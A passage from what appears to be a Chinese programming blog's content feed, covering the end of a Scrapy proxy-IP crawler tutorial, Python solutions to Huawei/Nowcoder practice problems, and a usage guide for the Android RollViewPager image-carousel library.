class="line">            item[<span class="string">'address'</span>] = s[s.rfind(<span class="string">'#'</span>,<span class="number">1</span>)+<span class="number">1</span>:s.rfind(<span class="string">' '</span>,<span class="number">1</span>)]    <span class="comment">#切分字符串，取出#号和空格之间的地址</span></div><div class="line">            <span class="keyword">yield</span> item  </div><div class="line">        </div><div class="line">        <span class="comment">#处理下一页</span></div><div class="line">        pagenum = <span class="string">''</span>.join(response.xpath(<span class="string">'/html/body/div[5]/div[1]/div[1]/div[3]/div[4]/li[8]/a/@href'</span>).extract())</div><div class="line">        <span class="keyword">print</span> pagenum</div><div class="line">        <span class="keyword">if</span> pagenum != <span class="string">'#'</span>: </div><div class="line">            nexturl = <span class="string">'http://www.youdaili.net/Daili/guonei/'</span> + pagenum</div><div class="line">            <span class="keyword">print</span> nexturl</div><div class="line">            <span class="keyword">yield</span> Request(nexturl, callback=self.parse)     <span class="comment">#爬取下一页</span></div></pre></td></tr></table></figure>
<p>　　IpSpider/items.py 的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> scrapy</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">IpspiderItem</span><span class="params">(scrapy.Item)</span>:</span></div><div class="line">    <span class="comment"># define the fields for your item here like:</span></div><div class="line">    ip = scrapy.Field()     <span class="comment">#ip字段</span></div><div class="line">    address = scrapy.Field()    <span class="comment">#地址字段</span></div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure>
<p>　　pipelines.py 和 settings.py我 们暂时不需处理，待下次深入学习 Scrapy 再来修改。</p>
<h5 id="开始爬取"><a href="#开始爬取" class="headerlink" title="开始爬取"></a>开始爬取</h5><p>　　<strong>进入项目的根目录</strong>，执行 crawl 命令启动 spider:</p>
<ul>
<li>只执行程序，不保存数据：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> scrapy crawl ip</span></div></pre></td></tr></table></figure>
<ul>
<li>执行程序，并输出保存数据：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> scrapy crawl ip -o ip.json</span></div></pre></td></tr></table></figure>
<p>　　该命令将采用 JSON 格式对爬取的数据进行序列化，生成 ip.json 文件。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/25-7.png" alt="25-7"></p>
<p>　　也可以采用 CSV 格式对爬取的数据进行序列化：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">scrapy crawl ip -o ip.csv</div></pre></td></tr></table></figure>
<p>　　将生成 ip.csv 文件。效果如下：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/25-8.png" alt="25-8"></p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title>算法学习-刷题(十一)</title>
    <url>/2016/12/14/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E5%8D%81%E4%B8%80/</url>
    <content><![CDATA[<p>　　这次的前5道题异常之简单，可以说基本上谈不上什么算法，最多只能算是熟悉Python的一些基本操作，所以额外加了3道题，当然，简单并不代表就没用，练手感也是很重要的，按照计划继续坚持练习，Keep Moving！</p>
<a id="more"></a>
<p>此篇博客的题目依然来自于牛客网（专业IT笔试面试备考平台）在线编程之：华为机试在线训练(11-15题，17题，20题，22题)。</p>
<p>地址如下：<a href="https://www.nowcoder.com/ta/huawei" target="_blank" rel="external">https://www.nowcoder.com/ta/huawei</a></p>
<h4 id="数字颠倒"><a href="#数字颠倒" class="headerlink" title="数字颠倒"></a>数字颠倒</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>输入一个整数，将这个整数以字符串的形式逆序输出<br>程序不考虑负数的情况，若数字含有0，则逆序形式也含有0，如输入为100，则输出为001</p>
<p>输入描述:</p>
<p>输入一个int整数</p>
<p>输出描述:</p>
<p>将这个整数以字符串的形式逆序输出</p>
<p>输入例子:</p>
<p>1516000</p>
<p>输出例子:</p>
<p>0006151</p>
<h5 id="Python实现"><a href="#Python实现" class="headerlink" title="Python实现"></a>Python实现</h5><p>这个题目和下一题字符串反转其实是一样的，我们既可以采用reversed函数也可以使用切片来进行反转，因此这两道题贴出来的代码是使用的不同的写法，但是其实都是对字符串进行反转。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">input_str = raw_input()</div><div class="line"><span class="keyword">print</span> <span class="string">''</span>.join(reversed(input_str))  <span class="comment">#使用reversed函数进行反转，再将列表转换成字符串格式输出</span></div></pre></td></tr></table></figure>
<h4 id="字符串反转"><a href="#字符串反转" class="headerlink" title="字符串反转"></a>字符串反转</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>写出一个程序，接受一个字符串，然后输出该字符串反转后的字符串。</p>
<p>输入描述:</p>
<p>输入N个字符</p>
<p>输出描述:</p>
<p>输出该字符串反转后的字符串</p>
<p>输入例子:</p>
<p>abcd</p>
<p>输出例子:</p>
<p>dcba</p>
<h5 id="Python实现-1"><a href="#Python实现-1" class="headerlink" title="Python实现"></a>Python实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">s = raw_input()</div><div class="line"><span class="keyword">print</span> s[::<span class="number">-1</span>]   <span class="comment">#使用切片进行反转</span></div></pre></td></tr></table></figure>
<h4 id="句子逆序"><a href="#句子逆序" class="headerlink" title="句子逆序"></a>句子逆序</h4><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>将一个英文语句以单词为单位逆序排放。例如“I am a boy”，逆序排放后为“boy a am I”<br>所有单词之间用一个空格隔开，语句中除了英文字母外，不再包含其他字符</p>
<p>接口说明<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">/**</div><div class="line"> * 反转句子</div><div class="line"> *</div><div class="line"> * @param sentence 原句子</div><div class="line"> * @return 反转后的句子</div><div class="line"> */</div><div class="line">public String reverse(String sentence);</div></pre></td></tr></table></figure></p>
<p>输入描述:</p>
<p>将一个英文语句以单词为单位逆序排放。</p>
<p>输出描述:</p>
<p>得到逆序的句子</p>
<p>输入例子:</p>
<p>I am a boy</p>
<p>输出例子:</p>
<p>boy a am I</p>
<h5 id="Python实现-2"><a href="#Python实现-2" class="headerlink" title="Python实现"></a>Python实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">string = raw_input()</div><div class="line">s = string.split()  <span class="comment">#对字符串按空格进行切分，split函数默认不给参数时默认按空格进行切分</span></div><div class="line">s.reverse()     <span class="comment">#列表进行反转</span></div><div class="line"><span class="keyword">print</span> <span class="string">' '</span>.join(s)   <span class="comment">#列表转换成字符串进行输出</span></div></pre></td></tr></table></figure>
<h4 id="字串的连接最长路径查找"><a href="#字串的连接最长路径查找" class="headerlink" title="字串的连接最长路径查找"></a>字串的连接最长路径查找</h4><h5 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h5><p>给定n个字符串，请对n个字符串按照字典序排列。</p>
<p>输入描述:</p>
<p>输入第一行为一个正整数n(1≤n≤1000),下面n行为n个字符串(字符串长度≤100),字符串中只含有大小写字母。</p>
<p>输出描述:</p>
<p>数据输出n行，输出结果为按照字典序排列的字符串。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入例子:</div><div class="line">9</div><div class="line">cap</div><div class="line">to</div><div class="line">cat</div><div class="line">card</div><div class="line">two</div><div class="line">too</div><div class="line">up</div><div class="line">boat</div><div class="line">boot</div><div class="line"></div><div class="line">输出例子:</div><div class="line">boat</div><div class="line">boot</div><div class="line">cap</div><div class="line">card</div><div class="line">cat</div><div class="line">to</div><div class="line">too</div><div class="line">two</div><div class="line">up</div></pre></td></tr></table></figure>
<h5 id="Python实现-3"><a href="#Python实现-3" class="headerlink" title="Python实现"></a>Python实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">lst = []</div><div class="line"></div><div class="line">n = int(raw_input())    <span class="comment">#要输入多少行数据</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">    input_str = raw_input()</div><div class="line">    lst.append(input_str)   <span class="comment">#将每一行数据添加到列表中</span></div><div class="line"></div><div class="line">lst.sort()  <span class="comment">#列表排序，sort函数默认按字典序进行排序</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</div><div class="line">    <span class="keyword">print</span> i     <span class="comment">#打印排序结果</span></div></pre></td></tr></table></figure>
<h4 id="求int型正整数在内存中存储时1的个数"><a href="#求int型正整数在内存中存储时1的个数" class="headerlink" title="求int型正整数在内存中存储时1的个数"></a>求int型正整数在内存中存储时1的个数</h4><h5 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h5><p>输入一个int型的正整数，计算出该int型数据在内存中存储时1的个数。</p>
<p>输入描述:</p>
<p>输入一个整数（int类型）</p>
<p>输出描述:</p>
<p>这个数转换成2进制后，输出1的个数</p>
<p>输入例子:</p>
<p>5</p>
<p>输出例子:</p>
<p>2</p>
<h5 id="Python实现-4"><a href="#Python实现-4" class="headerlink" title="Python实现"></a>Python实现</h5><p>使用bin函数将十进制整数转换成0bxx的二进制形式，用切片截取0b后面的字符串，再将其转换成列表，最后使用count函数来统计1的个数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(raw_input())</div><div class="line"><span class="keyword">print</span> list(bin(n)[<span class="number">2</span>:]).count(<span class="string">'1'</span>)</div></pre></td></tr></table></figure>
<h4 id="坐标移动"><a href="#坐标移动" class="headerlink" title="坐标移动"></a>坐标移动</h4><h5 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h5><p>开发一个坐标计算工具， A表示向左移动，D表示向右移动，W表示向上移动，S表示向下移动。从（0,0）点开始移动，从输入字符串里面读取一些坐标，并将最终输入结果输出到输出文件里面。</p>
<p>输入：</p>
<p>合法坐标为A(或者D或者W或者S) + 数字（两位以内）</p>
<p>坐标之间以;分隔。</p>
<p>非法坐标点需要进行丢弃。如AA10;  A1A;  $%$;  YAD; 等。</p>
<p>下面是一个简单的例子 如：</p>
<p>A10;S20;W10;D30;X;A1A;B10A11;;A10;</p>
<p>处理过程：</p>
<p>起点（0,0）</p>
<ul>
<li><p>A10   =  （-10,0）</p>
</li>
<li><p>S20   =  (-10,-20)</p>
</li>
<li><p>W10  =  (-10,-10)</p>
</li>
<li><p>D30  =  (20,-10)</p>
</li>
<li><p>x    =  无效</p>
</li>
<li><p>A1A   =  无效</p>
</li>
<li><p>B10A11   =  无效</p>
</li>
<li><p>一个空 不影响</p>
</li>
<li><p>A10  =  (10,-10)</p>
</li>
</ul>
<p>结果 （10， -10）</p>
<p>输入描述:</p>
<p>一行字符串</p>
<p>输出描述:</p>
<p>最终坐标，以,分隔</p>
<p>输入例子:</p>
<p>A10;S20;W10;D30;X;A1A;B10A11;;A10;</p>
<p>输出例子:</p>
<p>10,-10</p>
<h5 id="Python实现-5"><a href="#Python实现-5" class="headerlink" title="Python实现"></a>Python实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">tags = [<span class="string">'A'</span>,<span class="string">'D'</span>,<span class="string">'W'</span>,<span class="string">'S'</span>]</div><div class="line"></div><div class="line"><span class="keyword">for</span> input_str <span class="keyword">in</span> sys.stdin:     //处理多个测试数据</div><div class="line">    lst1 = input_str.split(<span class="string">';'</span>)     //根据;号将字符串切分成列表</div><div class="line">    lst2 = []   //存储正确坐标指令的列表</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lst1:</div><div class="line">        <span class="keyword">if</span> i == <span class="string">''</span>:     //空的，不影响</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        <span class="keyword">if</span> i[<span class="number">0</span>] <span class="keyword">in</span> tags:    //去除错误的指令</div><div class="line">            <span class="keyword">if</span> i[<span class="number">1</span>:].isdigit():</div><div class="line">                lst2.append(i)</div><div class="line"></div><div class="line">    res = [<span class="number">0</span>,<span class="number">0</span>]     //结果列表</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lst2:  //根据规则进行相应的移动</div><div class="line">        <span class="keyword">if</span> i[<span class="number">0</span>] == tags[<span class="number">0</span>]:</div><div class="line">            res[<span class="number">0</span>] -= int(i[<span class="number">1</span>:]);</div><div class="line">        <span class="keyword">elif</span> i[<span class="number">0</span>] == tags[<span class="number">1</span>]:</div><div class="line">            res[<span class="number">0</span>] += int(i[<span class="number">1</span>:]);</div><div class="line">        <span class="keyword">elif</span> i[<span class="number">0</span>] == tags[<span class="number">2</span>]:</div><div class="line">            res[<span class="number">1</span>] += int(i[<span class="number">1</span>:]);</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            res[<span class="number">1</span>] -= int(i[<span class="number">1</span>:]);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</div><div class="line">        res[i] = str(res[i])</div><div class="line"></div><div class="line">    <span class="keyword">print</span> <span class="string">','</span>.join(res)     //输出结果</div></pre></td></tr></table></figure>
<h4 id="密码验证合格程序"><a href="#密码验证合格程序" class="headerlink" title="密码验证合格程序"></a>密码验证合格程序</h4><h5 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h5><p>密码要求:</p>
<p>1.长度超过8位</p>
<p>2.包括大小写字母.数字.其它符号,以上四种至少三种</p>
<p>3.不能有相同长度超2的子串重复</p>
<p>说明:长度超过2的子串</p>
<p>输入描述:</p>
<p>一组或多组长度超过2的子符串。每组占一行</p>
<p>输出描述:</p>
<p>如果符合要求输出：OK，否则输出NG</p>
<p>输入例子:</p>
<p>021Abc9000</p>
<p>021Abc9Abc1</p>
<p>021ABC9000</p>
<p>021$bc9000</p>
<p>输出例子:</p>
<p>OK</p>
<p>NG</p>
<p>NG</p>
<p>OK</p>
<h5 id="Python实现-6"><a href="#Python实现-6" class="headerlink" title="Python实现"></a>Python实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwdCheck</span><span class="params">(password)</span>:</span>     //验证函数</div><div class="line">    cnt = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</div><div class="line">    length = len(password)</div><div class="line">    <span class="keyword">if</span> length &lt;= <span class="number">8</span>:     //判断长度是否超过<span class="number">8</span>位</div><div class="line">        <span class="keyword">return</span> <span class="string">'NG'</span></div><div class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(length - <span class="number">3</span>):     //判断是否有相同长度超<span class="number">2</span>的子串重复</div><div class="line">        <span class="keyword">if</span>(password[k:k+<span class="number">3</span>] <span class="keyword">in</span> password[:k] <span class="keyword">or</span> password[k:k+<span class="number">3</span>] <span class="keyword">in</span> password[k+<span class="number">3</span>:]):</div><div class="line">            <span class="keyword">return</span> <span class="string">'NG'</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> password:  //判断是否包括大小写字母.数字.其它符号,以上四种至少三种</div><div class="line">        <span class="keyword">if</span> i.isalpha():     //字母</div><div class="line">            <span class="keyword">if</span> i.isupper():     //大写字母</div><div class="line">                cnt[<span class="number">0</span>] = <span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:       //小写字母</div><div class="line">                cnt[<span class="number">1</span>] = <span class="number">1</span>           </div><div class="line">        <span class="keyword">elif</span> i.isdigit():   //数字</div><div class="line">            cnt[<span class="number">2</span>] = <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:   //其他字符</div><div class="line">            cnt[<span class="number">3</span>] = <span class="number">1</span></div><div class="line">        count = sum(cnt)</div><div class="line">        <span class="keyword">if</span> count &gt; <span class="number">2</span>:   //超过<span class="number">3</span>种则OK</div><div class="line">            <span class="keyword">return</span> <span class="string">'OK'</span></div><div class="line">    <span class="keyword">if</span> count &lt; <span class="number">3</span>:   //小于<span class="number">3</span>种则不合格</div><div class="line">        <span class="keyword">return</span> <span class="string">'NG'</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="string">'OK'</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> sys.stdin.readlines():  //实现多次测试</div><div class="line">    <span class="keyword">print</span> pwdCheck(line.strip(<span class="string">'\n'</span>))    //去除输入的回车符号</div></pre></td></tr></table></figure>
<h4 id="汽水瓶"><a href="#汽水瓶" class="headerlink" title="汽水瓶"></a>汽水瓶</h4><h5 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h5><p>有这样一道智力题：“某商店规定：三个空汽水瓶可以换一瓶汽水。小张手上有十个空汽水瓶，她最多可以换多少瓶汽水喝？”答案是5瓶，方法如下：先用9个空瓶子换3瓶汽水，喝掉3瓶满的，喝完以后4个空瓶子，用3个再换一瓶，喝掉这瓶满的，这时候剩2个空瓶子。然后你让老板先借给你一瓶汽水，喝掉这瓶满的，喝完以后用3个空瓶子换一瓶满的还给老板。如果小张手上有n个空汽水瓶，最多可以换多少瓶汽水喝？</p>
<p>输入描述:</p>
<p>输入文件最多包含10组测试数据，每个数据占一行，仅包含一个正整数n（1&lt;=n&lt;=100），表示小张手上的空汽水瓶数。n=0表示输入结束，你的程序不应当处理这一行。</p>
<p>输出描述:</p>
<p>对于每组测试数据，输出一行，表示最多可以喝的汽水瓶数。如果一瓶也喝不到，输出0。</p>
<p>输入例子:</p>
<p>3</p>
<p>10</p>
<p>81</p>
<p>0</p>
<p>输出例子:</p>
<p>1</p>
<p>5</p>
<p>40</p>
<h5 id="Python实现-7"><a href="#Python实现-7" class="headerlink" title="Python实现"></a>Python实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCount</span><span class="params">(n)</span>:</span>    //计数函数</div><div class="line">    cnt = <span class="number">0</span></div><div class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> n != <span class="number">1</span>:   //直到只有一瓶汽水</div><div class="line">        cnt = cnt + n/<span class="number">3</span>     //记录喝掉的汽水瓶数</div><div class="line">        n = n/<span class="number">3</span> + n%<span class="number">3</span>   //剩下的汽水瓶数</div><div class="line">        <span class="keyword">if</span> n == <span class="number">2</span>:  //剩下两个瓶盖的时候可以先喝一瓶再凑足<span class="number">3</span>个还给老板</div><div class="line">            n = <span class="number">3</span></div><div class="line">    <span class="keyword">return</span> cnt</div><div class="line"></div><div class="line">num = sys.stdin.readlines()     //输入多行</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> num:</div><div class="line">    <span class="keyword">print</span> getCount(int(i))</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>算法学习</tag>
        <tag>华为机试</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 图片轮播框架：RollViewPager</title>
    <url>/2016/12/11/Android%20%E5%9B%BE%E7%89%87%E8%BD%AE%E6%92%AD%E6%A1%86%E6%9E%B6%EF%BC%9ARollViewPager/</url>
    <content><![CDATA[<p>　　经常上网逛一逛还是能有不少的收获，以前自己用 ViewFlipper 控件来实现 android 的图片轮播效果，做得实在是不怎么样，很多小细节不知道怎么处理，现在好了，在 Github 上找到一个开源的图片轮播框架，只需要大概30行代码就可以很好地实现图片轮播功能，推荐给大家！</p>
<a id="more"></a>
<h4 id="RollViewPager简介"><a href="#RollViewPager简介" class="headerlink" title="RollViewPager简介"></a>RollViewPager简介</h4><p>　　自动轮播的 Viewpager，支持无限循环。触摸时会暂停播放，直到结束触摸一个延迟周期以后继续播放。其中的指示器可以为点可以为数字还可以自定义，位置也可以变。</p>
<p>　　Github 项目地址：<a href="https://github.com/Jude95/RollViewPager" target="_blank" rel="external">https://github.com/Jude95/RollViewPager</a></p>
<p>　　下文大部分均摘抄自该项目的说明文档，可以直接看本博客，也可以到 Github 上看说明文档，本文旨在宣传该开源框架。</p>
<h4 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h4><p>　　以 Android Studio为例：</p>
<h5 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h5><p>　　在 gradle 中导入包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">compile &apos;com.jude:rollviewpager:1.4.5&apos;</div></pre></td></tr></table></figure>
<h5 id="添加控件"><a href="#添加控件" class="headerlink" title="添加控件"></a>添加控件</h5><p>　　编写布局文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">com.jude.rollviewpager.RollPagerView</span></span></div><div class="line">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></div><div class="line">    <span class="attr">android:layout_height</span>=<span class="string">"180dp"</span></div><div class="line">    <span class="attr">app:rollviewpager_play_delay</span>=<span class="string">"3000"</span>/&gt;</div></pre></td></tr></table></figure>
<p>　　还可以为其添加如下属性：</p>
<ul>
<li><p>app:rollviewpager_play_delay=”3000” 播放间隔时间，单位ms。填0则不播放。默认为0。</p>
</li>
<li><p>app:rollviewpager_hint_gravity=”center” 指示器位置,提供 left , center , right 。默认 center 。</p>
</li>
<li><p>app:rollviewpager_hint_color=”#7c7c7c” 指示器背景颜色。默认黑色。</p>
</li>
<li><p>app:rollviewpager_hint_alpha=”80” 指示器背景透明度。0全透明，255不透明。默认0。</p>
</li>
<li><p>app:rollviewpager_hint_paddingLeft=”16dp” 指示器左边距。</p>
</li>
<li><p>app:rollviewpager_hint_paddingRight=”16dp” 指示器右边距。</p>
</li>
<li><p>app:rollviewpager_hint_paddingTop=”16dp” 指示器上边距。</p>
</li>
<li><p>app:rollviewpager_hint_paddingBottom=”16dp” 指示器下边距。</p>
</li>
</ul>
<p>　　一般指定一下间隔时间就好了。</p>
<h5 id="HintView指示器配置"><a href="#HintView指示器配置" class="headerlink" title="HintView指示器配置"></a>HintView指示器配置</h5><p>　　提供了 HintView 是对指示器进行自定义，下面的设置一种方式就好了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">mRollViewPager.setHintView(<span class="keyword">new</span> IconHintView(<span class="keyword">this</span>,R.drawable.point_focus,R.drawable.point_normal)); <span class="comment">//指示器为图片</span></div><div class="line">mRollViewPager.setHintView(<span class="keyword">new</span> ColorPointHintView(<span class="keyword">this</span>, Color.YELLOW,Color.WHITE)); <span class="comment">//指示器为由颜色的点</span></div><div class="line">mRollViewPager.setHintView(<span class="keyword">new</span> TextHintView(<span class="keyword">this</span>)); <span class="comment">//指示器为文本</span></div><div class="line">mRollViewPager.setHintView(<span class="keyword">null</span>);<span class="comment">//隐藏指示器</span></div></pre></td></tr></table></figure>
<h5 id="ItemClickListener监听点击事件"><a href="#ItemClickListener监听点击事件" class="headerlink" title="ItemClickListener监听点击事件"></a>ItemClickListener监听点击事件</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">mRollViewPager.setOnItemClickListener(<span class="keyword">new</span> OnItemClickListener() &#123;</div><div class="line">  <span class="meta">@Override</span></div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onItemClick</span><span class="params">(<span class="keyword">int</span> position)</span> </span>&#123;</div><div class="line">      Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">"Item "</span>+position+<span class="string">" clicked"</span>,Toast.LENGTH_SHORT).show();</div><div class="line">  &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<h5 id="Adapter"><a href="#Adapter" class="headerlink" title="Adapter"></a>Adapter</h5><p>　　提供以下三种种方便的 PagerAdapter 供使用。本 ViewPager 也可以使用其他任意 PagerAdapter。</p>
<p><strong>（1）StaticPagerAdapter</strong></p>
<p>　　存储页面的 Adapter。View 添加进去就存储，不会再次 getView ，减少页面创建消耗，但是会消耗更多的内存。一般自动播放的情况这种方案比较好。不然会大量构造 View。 </p>
<p><strong>概念参照FragmentPagerAdapter。可以用于其他ViewPager。</strong></p>
<p><strong>（2）DynamicPagerAdapter</strong></p>
<p>　　动态的 Adapter，当创建 3 号 View 时会销毁 1 号 View(递推)，会时常调用 getView 。增加页面创建消耗，减小内存消耗。 <strong>概念参照 FragmentStatePagerAdapter。可以用于其他 ViewPager。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="comment">//以上2个Adapter用法类似;</span></div><div class="line">mRollViewPager.setAdapter(<span class="keyword">new</span> TestNomalAdapter());</div><div class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">TestNomalAdapter</span> <span class="keyword">extends</span> <span class="title">StaticPagerAdapter</span></span>&#123;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] imgs = &#123;</div><div class="line">            R.drawable.img1,</div><div class="line">            R.drawable.img2,</div><div class="line">            R.drawable.img3,</div><div class="line">            R.drawable.img4,</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> View <span class="title">getView</span><span class="params">(ViewGroup container, <span class="keyword">int</span> position)</span> </span>&#123;</div><div class="line">        ImageView view = <span class="keyword">new</span> ImageView(container.getContext());</div><div class="line">        view.setImageResource(imgs[position]);</div><div class="line">        view.setScaleType(ImageView.ScaleType.CENTER_CROP);</div><div class="line">        view.setLayoutParams(<span class="keyword">new</span> ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));</div><div class="line">        <span class="keyword">return</span> view;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCount</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> imgs.length;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>（3）LoopPagerAdapter</strong></p>
<p>　　无限循环的 Adapter，无限循环上采用的是 getCount 返回最大的int数的方法，和 StaticPagerAdapter页面存储一样。一次创建多次使用。数据采用 StaticPagerAdapter 的方案，节省创建 View 开销。 <strong>本 Adapter 只能用于本 RollViewPager。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">mRollViewPager.setAdapter(<span class="keyword">new</span> TestLoopAdapter(mRollViewPager));</div><div class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">TestLoopAdapter</span> <span class="keyword">extends</span> <span class="title">LoopPagerAdapter</span></span>&#123;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] imgs = &#123;</div><div class="line">            R.drawable.img1,</div><div class="line">            R.drawable.img2,</div><div class="line">            R.drawable.img3,</div><div class="line">            R.drawable.img4,</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestLoopAdapter</span><span class="params">(RollPagerView viewPager)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>(viewPager);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> View <span class="title">getView</span><span class="params">(ViewGroup container, <span class="keyword">int</span> position)</span> </span>&#123;</div><div class="line">        ImageView view = <span class="keyword">new</span> ImageView(container.getContext());</div><div class="line">        view.setImageResource(imgs[position]);</div><div class="line">        view.setScaleType(ImageView.ScaleType.CENTER_CROP);</div><div class="line">        view.setLayoutParams(<span class="keyword">new</span> ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));</div><div class="line">        <span class="keyword">return</span> view;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getRealCount</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> imgs.length;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="播放控制"><a href="#播放控制" class="headerlink" title="播放控制"></a>播放控制</h5><ul>
<li>rollViewPager.pause() 暂停</li>
<li>rollViewPager.resume() 恢复</li>
<li>rollViewPager.isPlaying() 是否正在播放</li>
</ul>
<h4 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h4><p>　　布局文件：</p>
